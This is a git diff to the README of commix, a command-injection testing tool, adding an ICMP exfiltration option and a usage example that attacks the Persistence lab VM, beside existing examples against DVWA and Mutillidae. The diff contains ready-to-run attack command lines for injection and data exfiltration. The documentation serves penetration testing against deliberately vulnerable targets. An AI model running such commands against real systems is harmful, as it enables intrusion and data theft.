@@ -73,6 +73,9 @@ Download commix by cloning the Git repository:
                         techniques (Default: 1 sec).
     --base64            Use Base64 (enc)/(de)code trick to prevent false-
                         positive results.
+    --icmp_exfil=IP_..  Use the ICMP exfiltration technique (e.g.
+                        'ip_src=192.168.178.1,ip_dst=192.168.178.3').
+
 ####Usage Examples
 **Exploiting [Damn Vulnerable Web App] (http://www.dvwa.co.uk/)**
 
@@ -85,3 +88,8 @@ Download commix by cloning the Git repository:
 **Exploiting [OWASP Mutillidae] (https://www.owasp.org/index.php/Category:OWASP_Mutillidae) using Extra headers and HTTP proxy:**
 
     python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php" --data="target_host=INJECT_HERE" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"
+
+**Exploiting [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/) using ICMP exfiltration technique :**
+
+    su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp_exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
+
